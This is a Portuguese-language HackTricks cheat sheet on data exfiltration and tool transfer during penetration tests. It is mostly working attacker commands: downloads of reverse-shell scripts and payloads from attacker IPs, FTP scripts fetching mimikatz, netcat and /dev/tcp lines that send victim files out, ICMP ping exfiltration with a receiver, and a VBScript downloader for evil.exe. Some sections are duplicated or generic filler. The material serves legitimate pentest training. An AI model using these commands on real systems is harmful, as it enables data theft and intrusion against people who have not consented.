## Exfiltração

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Copiar e Colar Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Enviar arquivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimindo GET e POSTs (também cabeçalhos)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

---

#### **Description**

The HTTPS server exfiltration method involves setting up a web server that uses HTTPS to encrypt the communication between the server and the client. This method is useful when the target network is monitored for suspicious traffic and the use of HTTPS is not considered suspicious.

#### **Description**

O método de exfiltração do servidor HTTPS envolve a configuração de um servidor web que usa HTTPS para criptografar a comunicação entre o servidor e o cliente. Este método é útil quando a rede de destino é monitorada para tráfego suspeito e o uso de HTTPS não é considerado suspeito.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (Python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

O servidor FTP é uma das maneiras mais comuns de transferir arquivos de um sistema para outro. O NodeJS oferece uma biblioteca nativa para criar um servidor FTP. O código abaixo mostra como criar um servidor FTP simples usando o NodeJS:

```javascript
const FtpSvr = require('ftp-srv');
const ftpServer = new FtpSvr('ftp://127.0.0.1:3333', {
  anonymous: true,
  greeting: 'Welcome to my FTP server',
});

ftpServer.on('login', (data, resolve, reject) => {
  resolve({ root: '/path/to/ftp/root' });
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server listening on port 3333');
  });
```

Este código cria um servidor FTP que escuta na porta 3333 e permite conexões anônimas. Quando um usuário se conecta, o servidor FTP retorna uma mensagem de boas-vindas. O evento `login` é acionado quando um usuário faz login no servidor FTP. Neste exemplo, o servidor FTP retorna o diretório raiz `/path/to/ftp/root` para o usuário.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)

O protocolo FTP é um dos protocolos mais antigos e amplamente utilizados para transferência de arquivos. O servidor FTP Pure-FTP é uma implementação popular do protocolo FTP que é conhecida por sua simplicidade e facilidade de uso. No entanto, como muitos servidores FTP, o Pure-FTP não é seguro por padrão e pode ser vulnerável a ataques de exfiltração de dados.

Existem várias técnicas que podem ser usadas para exfiltrar dados de um servidor FTP, incluindo:

- Transferência de arquivos para um servidor remoto: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor remoto controlado pelo invasor.
- Transferência de arquivos para um servidor de terceiros: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor de terceiros que não esteja sob seu controle.
- Transferência de arquivos para um serviço de armazenamento em nuvem: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um serviço de armazenamento em nuvem, como o Dropbox ou o Google Drive.

Para evitar a exfiltração de dados por meio do servidor FTP, é importante implementar medidas de segurança, como criptografia de dados em trânsito e autenticação forte. Além disso, é importante monitorar o tráfego de rede em busca de atividades suspeitas e limitar o acesso ao servidor FTP apenas a usuários autorizados.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Cliente **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali como servidor
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou crie um compartilhamento smb **usando o samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltração em Windows

A exfiltração de dados em sistemas Windows pode ser realizada de várias maneiras, incluindo:

## 1. Uso de ferramentas de linha de comando

As ferramentas de linha de comando do Windows, como `bitsadmin`, `certutil`, `powershell`, `netsh`, `reg`, `wevtutil`, `wmic`, entre outras, podem ser usadas para exfiltrar dados. Essas ferramentas podem ser usadas para codificar, compactar e enviar dados para um servidor remoto.

## 2. Uso de aplicativos de terceiros

Os aplicativos de terceiros, como o `Cobalt Strike`, `Metasploit`, `PowerSploit`, `Empire`, `Pupy`, entre outros, podem ser usados para exfiltrar dados. Esses aplicativos geralmente têm recursos avançados de exfiltração, como a capacidade de exfiltrar dados por meio de protocolos de rede específicos ou por meio de canais ocultos.

## 3. Uso de malware personalizado

O malware personalizado pode ser criado para exfiltrar dados de um sistema Windows. O malware pode ser projetado para se comunicar com um servidor remoto e enviar dados exfiltrados por meio de protocolos de rede específicos ou por meio de canais ocultos.

## 4. Uso de técnicas de engenharia social

As técnicas de engenharia social podem ser usadas para exfiltrar dados de um sistema Windows. Por exemplo, um invasor pode usar um e-mail de phishing para enviar dados exfiltrados para um endereço de e-mail controlado pelo invasor.

## 5. Uso de dispositivos de armazenamento externos

Os dispositivos de armazenamento externos, como unidades USB, discos rígidos externos e cartões SD, podem ser usados para exfiltrar dados de um sistema Windows. Esses dispositivos podem ser conectados ao sistema e os dados podem ser copiados para o dispositivo de armazenamento externo.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

O atacante precisa ter o SSHd em execução.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Se a vítima tiver SSH, o atacante pode montar um diretório da vítima para o atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

O comando `nc` (netcat) é uma ferramenta de rede que pode ser usada para transferir dados de um host para outro. Ele pode ser usado para exfiltrar dados de um sistema comprometido para um host controlado pelo atacante.

Para usar o `nc` para exfiltrar dados, primeiro é necessário iniciar um listener no host controlado pelo atacante. Isso pode ser feito usando o seguinte comando:

```
nc -l -p <port> > output.file
```

Isso iniciará um listener na porta especificada e redirecionará a saída para um arquivo chamado `output.file`.

Em seguida, no sistema comprometido, o `nc` pode ser usado para enviar dados para o host controlado pelo atacante. Isso pode ser feito usando o seguinte comando:

```
nc <attacker_ip> <port> < input.file
```

Isso enviará o conteúdo do arquivo `input.file` para o host controlado pelo atacante na porta especificada.

O `nc` também pode ser usado para transferir arquivos inteiros em vez de dados brutos. Isso pode ser feito usando o seguinte comando no host comprometido:

```
nc <attacker_ip> <port> < file_to_transfer
```

Isso enviará o arquivo `file_to_transfer` para o host controlado pelo atacante na porta especificada.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Baixar arquivo da vítima
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Enviar arquivo para a vítima
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

(ICMP) é um protocolo de camada de rede usado para enviar mensagens de erro e informações operacionais sobre problemas de rede. O ICMP é frequentemente usado em conjunto com outros protocolos de rede, como o IP, para fornecer informações sobre o status da rede. O ICMP é usado por muitas ferramentas de teste de penetração para exfiltrar dados de uma rede.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber os dados com python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por padrão no XP e 2003 (em outros sistemas operacionais é necessário adicioná-lo explicitamente durante a instalação)

No Kali, **inicie o servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP em Python:**

Um servidor TFTP é uma ferramenta útil para exfiltrar dados de uma rede. O TFTP é um protocolo simples que permite a transferência de arquivos entre dispositivos em uma rede. O servidor TFTP em Python é uma implementação fácil de usar que pode ser personalizada para atender às necessidades específicas de um teste de penetração. O código-fonte do servidor TFTP em Python pode ser encontrado em vários repositórios online e pode ser facilmente modificado para atender às necessidades do usuário.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
No **alvo**, conecte-se ao servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Baixe um arquivo com um PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript é uma linguagem de script da Microsoft que é usada para automatizar tarefas em sistemas Windows. É uma linguagem de script interpretada que é executada pelo Windows Script Host. VBScript é uma linguagem de programação fácil de aprender e é usada para criar scripts que podem ser usados para exfiltrar dados de um sistema. Existem várias técnicas que podem ser usadas para exfiltrar dados usando VBScript, incluindo o uso de FTP, HTTP e SMTP. O VBScript também pode ser usado para criar backdoors em sistemas Windows, permitindo que um invasor acesse o sistema remotamente.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Vítima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então, a ideia é que pegamos binários, como `netcat`. E então desmontamos em hex, colamos em um arquivo na máquina comprometida e, em seguida, montamos com `debug.exe`.

`Debug.exe` só pode montar 64 kb. Então, precisamos usar arquivos menores que isso. Podemos usar o upx para comprimi-lo ainda mais. Então, vamos fazer isso:
```
upx -9 nc.exe
```
Agora ele pesa apenas 29 kb. Perfeito. Então, agora vamos desmontá-lo:
```
wine exe2bat.exe nc.exe nc.txt
```
Agora basta copiar e colar o texto em nosso shell do Windows. E ele criará automaticamente um arquivo chamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
